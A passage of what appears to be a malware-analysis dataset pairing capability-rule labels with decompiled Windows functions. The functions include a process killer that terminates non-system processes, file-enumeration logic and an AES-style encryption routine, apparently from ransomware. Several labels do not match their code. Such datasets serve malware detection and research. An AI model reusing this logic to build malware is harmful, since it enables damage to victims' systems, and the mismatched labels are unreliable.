= iVar8 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    iVar8 = 0;\n    if (0 < arg_ch) {\n        do {\n            *puVar2 = (&fcn.00401cd0::arg_10h)[iVar8];\n            iVar8 = iVar8 + 1;\n            puVar2 = puVar2 + 1;\n        } while (iVar8 < arg_ch);\n    }\n    puVar2 = &stack0xfffff30c;\n    for (iVar8 = 200; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    iVar8 = 0;\n    puVar2 = &stack0xfffff30c;\n    if (0 < in_stack_0000032c) {\n        do {\n            *puVar2 = *(&stack0x00000330 + iVar8 * 4);\n            iVar8 = iVar8 + 1;\n            puVar2 = puVar2 + 1;\n        } while (iVar8 < in_stack_0000032c);\n    }\n    iVar8 = in_stack_0000032c;\n    puVar2 = fcn.004039b0(&fcn.00401cd0::var_65dh + 1, in_stack_0000032c, in_stack_fffff30c);\n    puVar9 = &fcn.00401cd0::var_334h;\n    for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    fcn.00406652();\n    iVar4 = var_334h * 4;\n    arg_8h_02 = fcn.00406657();\n    iVar4 = fcn.004043b0(arg_8h_02, iVar4);\n    if ((iVar4 < var_680h) && (uVar3 = var_680h - iVar4,  0 < uVar3)) {\n        puVar2 = var_674h + var_664h;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        for (uVar5 = uVar3 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        var_664h = var_664h + uVar3;\n    }\n    iVar6 = 0;\n    if (0 < iVar4) {\n        do {\n            puVar7 = iVar6 + arg_8h_02;\n            iVar6 = iVar6 + 1;\n            var_674h[var_664h] = *puVar7;\n            var_664h = var_664h + 1;\n        } while (iVar6 < iVar4);\n    }\n    fcn.00406652();\n    if (var_678h <= var_668h) {\n        var_674h[var_664h] = 0;\n        fcn.0040640a(iVar8);\n        return;\n    }\n    goto code_r0x00401d52;\n}\n",
        "token_count": 1899
    },
    "00405aa0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl fcn.00405aa0(int32_t arg_8h, uint32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t *in_ECX;\n    uint32_t *puVar1;\n    uint32_t arg_8h_00;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    uVar2 = arg_ch & 0xf;\n    arg_8h_00 = arg_ch;\n    while (uVar2 != 0) {\n        arg_8h_00 = arg_8h_00 + 1;\n        uVar2 = arg_8h_00 & 0xf;\n    }\n    if (arg_ch != 0) {\n        puVar1 = arg_10h;\n        uVar2 = arg_ch;\n        do {\n            *puVar1 = *((arg_8h - arg_10h) + puVar1);\n            uVar2 = uVar2 - 1;\n            puVar1 = puVar1 + 1;\n        } while (uVar2 != 0);\n    }\n    if (arg_ch < arg_8h_00) {\n        puVar3 = arg_ch + arg_10h;\n        for (uVar2 = arg_8h_00 - arg_ch >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        for (uVar2 = arg_8h_00 - arg_ch & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    var_24h = arg_8h_00 >> 4;\n    if (var_24h != 0) {\n        do {\n            *arg_10h = *arg_10h ^ *in_ECX;\n            arg_10h[1] = arg_10h[1] ^ in_ECX[1];\n            arg_10h[2] = arg_10h[2] ^ in_ECX[2];\n            arg_10h[3] = arg_10h[3] ^ in_ECX[3];\n            var_14h = *arg_10h;\n            var_10h = arg_10h[1];\n            var_ch = arg_10h[2];\n            var_8h = arg_10h[3];\n            var_20h = 0xd;\n            puVar1 = in_ECX + 2;\n            do {\n                *arg_10h = *((var_8h >> 0x18) * 4 + 0x4218a0) ^ *((var_ch >> 0x10 & 0xff) * 4 + 0x420fa0) ^\n                           *((var_10h >> 8 & 0xff) * 4 + 0x421ca0) ^ *((var_14h & 0xff) * 4 + 0x4220a0) ^ puVar1[2];\n                arg_10h[1] = *((var_8h >> 0x10 & 0xff) * 4 + 0x420fa0) ^ *((var_ch >> 8 & 0xff) * 4 + 0x421ca0) ^\n                             *((var_14h >> 0x18) * 4 + 0x4218a0) ^ *((var_10h & 0xff) * 4 + 0x4220a0) ^ puVar1[3];\n                uVar2 = *((var_ch >> 0x18) * 4 + 0x4218a0);\n                arg_10h[2] = *((var_8h >> 8 & 0xff) * 4 + 0x421ca0) ^ *((var_10h >> 0x18) * 4 + 0x4218a0) ^\n                             *((var_14h >> 0x10 & 0xff) * 4 + 0x420fa0) ^ *((var_ch & 0xff) * 4 + 0x4220a0) ^ puVar1[4];\n                var_20h = var_20h + -1;\n                arg_10h[3] = uVar2 ^ *((var_10h >> 0x10 & 0xff) * 4 + 0x420fa0) ^\n                             *((var_14h >> 8 & 0xff) * 4 + 0x421ca0) ^ *((var_8h & 0xff) * 4 + 0x4220a0) ^ puVar1[5];\n                var_14h = *arg_10h;\n                var_10h = arg_10h[1];\n                var_ch = arg_10h[2];\n                var_8h = arg_10h[3];\n                puVar1 = puVar1 + 4;\n            } while (var_20h != 0);\n            *arg_10h = CONCAT31(CONCAT21(CONCAT11(str.cw[var_8h >> 0x18], str.cw[var_ch >> 0x10 & 0xff]), \n                                         str.cw[var_10h >> 8 & 0xff]), str.cw[var_14h & 0xff]) ^ in_ECX[0x38];\n            arg_10h[1] = CONCAT31(CONCAT21(CONCAT11(str.cw[var_14h >> 0x18], str.cw[var_8h >> 0x10 & 0xff]), \n                                           str.cw[var_ch >> 8 & 0xff]), str.cw[var_10h & 0xff]) ^ in_ECX[0x39];\n            arg_10h[2] = CONCAT31(CONCAT21(CONCAT11(str.cw[var_10h >> 0x18], str.cw[var_14h >> 0x10 & 0xff]), \n                                           str.cw[var_8h >> 8 & 0xff]), str.cw[var_ch & 0xff]) ^ in_ECX[0x3a];\n            arg_10h[3] = CONCAT31(CONCAT21(CONCAT11(str.cw[var_ch >> 0x18], str.cw[var_10h >> 0x10 & 0xff]), \n                                           str.cw[var_14h >> 8 & 0xff]), str.cw[var_8h & 0xff]) ^ in_ECX[0x3b];\n            arg_10h = arg_10h + 4;\n            var_24h = var_24h - 1;\n        } while (var_24h != 0);\n        fcn.0040640a(arg_8h_00);\n        return;\n    }\n    fcn.0040640a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1637
    },
    "00412341": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t __cdecl fcn.00412341(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    char **ppcVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char **ppcVar8;\n    int32_t iVar9;\n    char *pcVar10;\n    char **ppcVar11;\n    char **var_20h;\n    char **var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    if (arg_ch == NULL) {\n        puVar5 = fcn.0040f5be();\n        iVar9 = 0x16;\n        *puVar5 = 0x16;\n        fcn.004099f0();\n    }\n    else {\n        *arg_ch = 0;\n        var_20h = NULL;\n        var_1ch = NULL;\n        var_18h = 0;\n        iVar9 = *arg_8h;\n        ppcVar11 = var_20h;\n        ppcVar4 = var_1ch;\n        while (var_20h = ppcVar11,  var_1ch = ppcVar4,  iVar9 != 0) {\n            var_4h = CONCAT13(var_4h >> 0x18, 0x3f2a);\n            iVar9 = fcn.00416f00(*arg_8h, &var_4h);\n            if (iVar9 == 0) {\n                iVar9 = fcn.00412046(*arg_8h, 0, 0, &var_20h);\n            }\n            else {\n                iVar9 = fcn.004120dc(*arg_8h, iVar9, &var_20h);\n            }\n            if (iVar9 != 0) goto code_r0x00412028;\n            arg_8h = arg_8h + 1;\n            ppcVar11 = var_20h;\n            ppcVar4 = var_1ch;\n            iVar9 = *arg_8h;\n        }\n        var_8h = NULL;\n        var_4h = NULL;\n        var_ch = (ppcVar4 - ppcVar11 >> 2) + 1;\n        pcVar10 = ~-(ppcVar4 < ppcVar11) & (ppcVar4 - ppcVar11) + 3U >> 2;\n        if (pcVar10 != NULL) {\n            var_4h = NULL;\n            ppcVar8 = ppcVar11;\n            do {\n                pcVar7 = *ppcVar8;\n                pcVar1 = pcVar7 + 1;\n                do {\n                    cVar2 = *pcVar7;\n                    pcVar7 = pcVar7 + 1;\n                } while (cVar2 != '\\0');\n                var_4h = pcVar7 + var_4h + (1 - pcVar1);\n                ppcVar8 = ppcVar8 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h != pcVar10);\n        }\n        iVar6 = fcn.0040d813(var_ch, var_4h, 1);\n        if (iVar6 == 0) {\n            iVar9 = -1;\n        }\n        else {\n            var_ch = iVar6 + var_ch * 4;\n            var_10h = var_ch;\n            if (ppcVar11 != ppcVar4) {\n                var_14h = iVar6 - ppcVar11;\n                do {\n                    var_8h = *ppcVar11;\n                    pcVar10 = var_8h + 1;\n                    do {\n                        cVar2 = *var_8h;\n                        var_8h = var_8h + 1;\n                    } while (cVar2 != '\\0');\n                    var_8h = var_8h + (1 - pcVar10);\n                    iVar9 = fcn.00416eeb(var_ch, var_4h + (var_10h - var_ch), *ppcVar11, var_8h);\n                    if (iVar9 != 0) {\n                        fcn.00409a1d(0, 0, 0, 0, 0);\n                        pcVar3 = swi(3);\n                        iVar9 = (*pcVar3)();\n                        return iVar9;\n                    }\n                    *(var_14h + ppcVar11) = var_ch;\n                    ppcVar11 = ppcVar11 + 1;\n                    var_ch = var_ch + var_8h;\n                } while (ppcVar11 != ppcVar4);\n            }\n            iVar9 = 0;\n            *arg_ch = iVar6;\n        }\n        fcn.0040e476(0);\ncode_r0x00412028:\n        fcn.00412260();\n    }\n    return iVar9;\n}\n",
        "token_count": 1140
    },
    "00401750": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401750(uint32_t **param_1, uint32_t *param_2, uint32_t *param_3)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t *extraout_ECX;\n    uint32_t *extraout_ECX_00;\n    uint32_t *extraout_ECX_01;\n    uint32_t uVar2;\n    uint32_t extraout_ECX_02;\n    uint32_t **ppuVar4;\n    uint32_t *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint32_t *var_8h;\n    uint32_t *var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    uint32_t *puVar3;\n    \n    uStack12 = 0x41a3a0;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    puVar5 = var_8h | 0xf;\n    if (puVar5 != 0xffffffff) {\n        puVar3 = param_1[5];\n        uVar2 = puVar3 >> 1;\n        var_8h = puVar5;\n        if ((puVar5 / 3 < uVar2) && (var_8h = uVar2 + puVar3,  -2 - uVar2 < puVar3)) {\n            var_8h = 0xfffffffe;\n        }\n    }\n    puVar5 = var_8h + 1;\n    var_4h = 0;\n    if (puVar5 == NULL) {\n        ppuVar4 = NULL;\n    }\n    else if (puVar5 < 0x1000) {\n        ppuVar4 = fcn.0040661a(puVar5);\n    }\n    else {\n        puVar3 = var_8h + 9;\n        if (puVar3 <= puVar5) {\n            fcn.0040637c();\n            puVar3 = extraout_ECX;\n        }\n        puVar5 = fcn.0040661a(puVar3);\n        ppuVar4 = puVar5 + 0x23U & 0xffffffe0;\n        ppuVar4[-1] = puVar5;\n    }\n    if (var_ch_2 != NULL) {\n        ppuVar1 = param_1;\n        if (0xf < param_1[5]) {\n            ppuVar1 = *param_1;\n        }\n        if (var_ch_2 != NULL) {\n            fcn.00419bb0(ppuVar4, ppuVar1, var_ch_2);\n        }\n    }\n    if (0xf < param_1[5]) {\n        puVar5 = *param_1;\n        if (0xfff < param_1[5] + 1U) {\n            puVar3 = puVar5;\n            if ((puVar5 & 0x1f) != 0) {\n                fcn.00409a00();\n                puVar3 = extraout_ECX_00;\n            }\n            puVar5 = puVar3[-1];\n            if (puVar3 <= puVar5) {\n                puVar5 = fcn.00409a00();\n                puVar3 = extraout_ECX_01;\n            }\n            uVar2 = puVar3 - puVar5;\n            if (uVar2 < 4) {\n                puVar5 = fcn.00409a00();\n                uVar2 = extraout_ECX_02;\n            }\n            if (0x23 < uVar2) {\n                puVar5 = fcn.00409a00();\n            }\n        }\n        fcn.0040664d(puVar5);\n    }\n    param_1[5] = 0xf;\n    param_1[4] = NULL;\n    ppuVar1 = param_1;\n    if (0xf < param_1[5]) {\n        ppuVar1 = *param_1;\n    }\n    *ppuVar1 = 0;\n    *param_1 = ppuVar4;\n    param_1[5] = var_8h;\n    param_1[4] = var_ch_2;\n    if (0xf < param_1[5]) {\n        param_1 = ppuVar4;\n    }\n    *(param_1 + var_ch_2) = 0;\n    *in_FS_OFFSET = var_ch_3;\n    return;\n}\n",
        "token_count": 1012
    },
    "00402080": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00402080(uint32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    if (*param_1 == 0x270) {\n        iVar3 = 0x270;\n        puVar1 = param_1 + 2;\n        do {\n            uVar2 = (puVar1[-1] ^ *puVar1) & 0x7fffffff ^ puVar1[-1];\n            puVar1[0x26f] = -((uVar2 & 1) != 0) & 0x9908b0df ^ puVar1[0x18c] ^ uVar2 >> 1;\n            iVar3 = iVar3 + -1;\n            puVar1 = puVar1 + 1;\n        } while (iVar3 != 0);\n    }\n    else if (0x4df < *param_1) {\n        fcn.00402120();\n    }\n    uVar2 = param_1[*param_1 + 1];\n    *param_1 = *param_1 + 1;\n    uVar2 = uVar2 ^ param_1[0x4e1] & uVar2 >> 0xb;\n    uVar2 = uVar2 ^ (uVar2 & 0xff3a58ad) << 7;\n    uVar2 = uVar2 ^ (uVar2 & 0xffffdf8c) << 0xf;\n    return uVar2 >> 0x12 ^ uVar2;\n}\n",
        "token_count": 350
    },
    "00402120": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402120(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    \n    iVar1 = 0xe3;\n    puVar3 = param_1 + 0x271;\n    do {\n        uVar2 = (puVar3[1] ^ *puVar3) & 0x7fffffff ^ *puVar3;\n        puVar3[-0x270] = -((uVar2 & 1) != 0) & 0x9908b0df ^ puVar3[0x18d] ^ uVar2 >> 1;\n        iVar1 = iVar1 + -1;\n        puVar3 = puVar3 + 1;\n    } while (iVar1 != 0);\n    iVar1 = 0x18c;\n    puVar3 = param_1 + 0x354;\n    do {\n        uVar2 = (puVar3[1] ^ *puVar3) & 0x7fffffff ^ *puVar3;\n        puVar3[-0x270] = -((uVar2 & 1) != 0) & 0x9908b0df ^ puVar3[-0x353] ^ uVar2 >> 1;\n        iVar1 = iVar1 + -1;\n        puVar3 = puVar3 + 1;\n    } while (iVar1 != 0);\n    uVar2 = (param_1[0x4e0] ^ param_1[1]) & 0x7fffffff ^ param_1[0x4e0];\n    param_1[0x270] = -((uVar2 & 1) != 0) & 0x9908b0df ^ param_1[0x18d] ^ uVar2 >> 1;\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 421
    },
    "00401960": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401960(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint var_139ch;\n    uint var_1398h;\n    uint var_1394h;\n    uint var_1390h;\n    uint32_t var_138ch;\n    uint32_t auStackY5004 [1247];\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419aa0();\n    var_138ch = fcn.004063e6();\n    var_ch = 0xffffffff;\n    iVar2 = 1;\n    uVar1 = var_138ch;\n    do {\n        uVar1 = (uVar1 >> 0x1e ^ uVar1) * 0x6c078965 + iVar2;\n        (&fcn.00401960::var_138ch)[iVar2] = uVar1;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x270);\n    if (arg_ch - arg_8h != -1) {\n        var_ch = 0x401a20;\n        fcn.00402000((arg_ch - arg_8h) + 1);\n        fcn.0040640a(unaff_ESI);\n        return;\n    }\n    fcn.00402080();\n    fcn.0040640a(unaff_EBP);\n    return;\n}\n",
        "token_count": 351
    },
    "004044d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004044d0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint uStackY20568;\n    uint uStackY20564;\n    int32_t iStackY20556;\n    uchar auStackY20008 [19936];\n    uint uStackY72;\n    int32_t iStackY68;\n    int32_t iStackY64;\n    uint uStackY60;\n    uchar *puStackY56;\n    char16_t *pcStackY52;\n    int32_t iStackY48;\n    uint uStackY44;\n    uchar *puStackY40;\n    uchar *puStackY36;\n    int32_t arg_8h;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    fcn.00419aa0();\n    arg_8h_00 = 0;\n    uStackY20568 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)();\n    if (iVar1 != -1) {\n        uStackY20564 = 0x22c;\n        arg_8h = iVar1;\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)();\n        pcVar4 = _sym.imp.KERNEL32.dll_OpenProcess;\n        pcVar5 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar2 != 0) {\n            do {\n                puStackY36 = 0x40454b;\n                iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n                if (iVar2 != iStackY20556) {\n                    puStackY36 = iStackY20556;\n                    puStackY40 = NULL;\n                    uStackY44 = 0x410;\n                    iStackY48 = 0x404563;\n                    iVar2 = (*pcVar4)();\n                    pcVar5 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (iVar2 != 0) {\n                        puStackY36 = 0x2710;\n                        puStackY40 = &stack0xffffb1d8;\n                        uStackY44 = 0;\n                        pcStackY52 = 0x40457e;\n                        iStackY48 = iVar2;\n                        iVar3 = (*_sym.imp.PSAPI.DLL_GetModuleFileNameExW)();\n                        if (iVar3 != 0) {\n                            puStackY56 = &stack0xffffb1d8;\n                            pcStackY52 = L\"\\\\Windows\\\\\";\n                            uStackY60 = 0x404593;\n                            puStackY56 = fcn.0040841d();\n                            if (puStackY56 == NULL) {\n                                pcStackY52 = iStackY20556;\n                                uStackY60 = 1;\n                                iStackY64 = 0x4045a5;\n                                iVar3 = (*pcVar4)();\n                                pcVar4 = _sym.imp.KERNEL32.dll_OpenProcess;\n                                if (iVar3 != 0) {\n                                    pcStackY52 = &stack0xffffafa8;\n                                    uStackY60 = 0x4045b9;\n                                    puStackY56 = iVar3;\n                                    (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)();\n                                    uStackY60 = uStackY20568;\n                                    iStackY68 = 0x4045c6;\n                                    iStackY64 = iVar3;\n                                    (*_sym.imp.KERNEL32.dll_TerminateProcess)();\n                                    uStackY72 = 0x4045cd;\n                                    iStackY68 = iVar3;\n                                    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                                    pcVar4 = _sym.imp.KERNEL32.dll_OpenProcess;\n                                }\n                            }\n                        }\n                        pcVar5 = _sym.imp.KERNEL32.dll_CloseHandle;\n                        puStackY56 = 0x4045dc;\n                        pcStackY52 = iVar2;\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                    }\n                }\n                puStackY36 = &stack0xffffafac;\n                uStackY44 = 0x4045f2;\n                puStackY40 = iVar1;\n                iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)();\n            } while (iVar2 != 0);\n            puStackY40 = 0x4045fd;\n            puStackY36 = iVar1;\n            (*pcVar5)();\n            fcn.0040640a(arg_8h);\n            return;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    fcn.0040640a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1037
    },
    "00405120": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Removing unreachable block (ram,0x004051c6)\n// WARNING: Removing unreachable block (ram,0x004051e6)\n// WARNING: Removing unreachable block (ram,0x004051f0)\n// WARNING: Removing unreachable block (ram,0x00405200)\n// WARNING: Removing unreachable block (ram,0x00405215)\n// WARNING: Removing unreachable block (ram,0x00405255)\n\nvoid fcn.00405120(void)\n\n{\n    uint *puVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint16_t *puVar5;\n    uint32_t uVar6;\n    uint arg_8h;\n    int16_t *piVar7;\n    uint16_t *puVar8;\n    uint unaff_EBP;\n    code *pcVar9;\n    bool bVar10;\n    uint16_t uStackY20014;\n    int16_t iStackY20012;\n    uchar auStackY20010 [19962];\n    uint uStackY48;\n    char16_t *pcStackY44;\n    uint uStackY40;\n    int32_t iStackY36;\n    uint var_4h;\n    \n    fcn.00419aa0();\n    iVar4 = fcn.0040cf26();\n    if (iVar4 != 0) {\n        iStackY36 = 0;\n        uStackY40 = 0xc0000000;\n        pcStackY44 = L\"Alad.alad\";\n        uStackY48 = 0x40516c;\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n        *0x42ef10 = iVar4;\n        if (iVar4 != -1) {\n            fcn.00408980();\n            uStackY40 = 0x4051b9;\n            iStackY36 = iVar4;\n            (*_sym.imp.KERNEL32.dll_ReadFile)();\n        }\n        *0x42ef08 = 0;\n        *0x42ef18 = 0;\n        fcn.00404620();\n        fcn.00404620();\n        fcn.00404700();\n        while (*0x431698 != NULL) {\n            while (*0x431698 != NULL) {\n                puVar1 = *0x431698 + 1;\n                *0x431698 = **0x431698;\n                iStackY36 = 0x4052d1;\n                fcn.0040cffe(&stack0xffffb1d4, 10000, *puVar1, 10000);\n                piVar7 = &stack0xffffb1d4;\n                do {\n                    iVar2 = *piVar7;\n                    piVar7 = piVar7 + 1;\n                } while (iVar2 != 0);\n                puVar5 = 0x420dc4;\n                puVar8 = &stack0xffffb1d2 + (piVar7 - &stack0xffffb1d6 >> 1) * 2;\n                do {\n                    uVar3 = *puVar8;\n                    bVar10 = uVar3 < *puVar5;\n                    if (uVar3 != *puVar5) {\ncode_r0x00405326:\n                        uVar6 = -bVar10 | 1;\n                        goto code_r0x0040532b;\n                    }\n                    if (uVar3 == 0) break;\n                    uVar3 = puVar8[1];\n                    bVar10 = uVar3 < puVar5[1];\n                    if (uVar3 != puVar5[1]) goto code_r0x00405326;\n                    puVar8 = puVar8 + 2;\n                    puVar5 = puVar5 + 2;\n                } while (uVar3 != 0);\n                uVar6 = 0;\ncode_r0x0040532b:\n                if (uVar6 != 0) {\n                    iStackY36 = 0x40534a;\n                    fcn.0040a351(&stack0xffffb1d4, 10000, 0x420dc4, 10000);\n                }\n                fcn.00405440();\n            }\n            fcn.00404620();\n            *0x431698 = *0x43169c;\n            *0x43169c = NULL;\n        }\n        fcn.004044d0();\n        pcVar9 = _sym.imp.KERNEL32.dll_CloseHandle;\n        while (*0x431694 != NULL) {\n            pcStackY44 = (*0x431694)[1];\n            *0x431694 = **0x431694;\n            iStackY36 = 0;\n            uStackY40 = 0xc0000000;\n            uStackY48 = 0x4053cc;\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n            pcVar9 = _sym.imp.KERNEL32.dll_CloseHandle;\n            if (iVar4 != -1) {\n                arg_8h = (*_sym.imp.KERNEL32.dll_GetFileSize)();\n                pcVar9 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                fcn.00404c60(arg_8h, 0);\n            }\n        }\n        fcn.00404620();\n        if (*0x42ef10 != -1) {\n            (*pcVar9)();\n        }\n    }\n    fcn.0040640a(unaff_EBP);\n    return;\n}\n",
        "token_count": 1216
    },
    "00405800": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpNumberOfBytesRead\n\nvoid __cdecl fcn.00405800(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint lpNumberOfBytesRead;\n    uint lpBuffer;\n    uint var_bh;\n    uint var_4h;\n    \n    if ((in_ECX != -1) && ((arg_ch != 0 || (0x108 < arg_8h)))) {\n        lpNumberOfBytesRead = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n        if (iVar1 != 0) {\n            (*_sym.imp.KERNEL32.dll_ReadFile)();\n        }\n    }\n    fcn.0040640a(lpNumberOfBytesRead);\n    return;\n}\n",
        "token_count": 179
    },
    "0040c7b3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040c7b3(uint *param_1)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_8h = param_1[10];\n    iVar1 = *(param_1[5] + -4);\n    param_1[0xd] = iVar1;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar2 = fcn.0040a905(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar2 == '\\0') {\n        if (iVar1 == 0) {\n            param_1[0xd] = 0x41bed4;\n        }\n        uVar3 = fcn.0040c827(arg_8h);\n    }\n    else {\n        if (iVar1 == 0) {\n            param_1[0xd] = L\"(null)\";\n        }\n        *(param_1 + 0xf) = 1;\n        uVar3 = fcn.00410644(param_1[0xd], arg_8h);\n    }\n    param_1[0xe] = uVar3;\n    return 1;\n}\n",
        "token_count": 316
    },
    "0040cffe": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cffe(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    uint uVar6;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x0040cf53:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = 0;\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    iVar3 = arg_14h;\n                    iVar4 = arg_ch;\n                    piVar5 = arg_8h;\n                    if (arg_14h == -1) {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar5);\n                            *piVar5 = iVar1;\n                            piVar5 = piVar5 + 1;\n                            if (iVar1 == 0) break;\n                            iVar4 = iVar4 + -1;\n                        } while (iVar4 != 0);\n                    }\n                    else {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar5);\n                            *piVar5 = iVar1;\n                            piVar5 = piVar5 + 1;\n                            if ((iVar1 == 0) || (iVar4 = iVar4 + -1,  iVar4 == 0)) break;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                        if (iVar3 == 0) {\n                            *piVar5 = 0;\n                        }\n                    }\n                    if (iVar4 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = 0;\n                        return 0x50;\n                    }\n                    *arg_8h = 0;\n                    puVar2 = fcn.0040f5be();\n                    uVar6 = 0x22;\n                    goto code_r0x0040cf78;\n                }\n                *arg_8h = 0;\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x0040cf53;\n    puVar2 = fcn.0040f5be();\n    uVar6 = 0x16;\ncode_r0x0040cf78:\n    *puVar2 = uVar6;\n    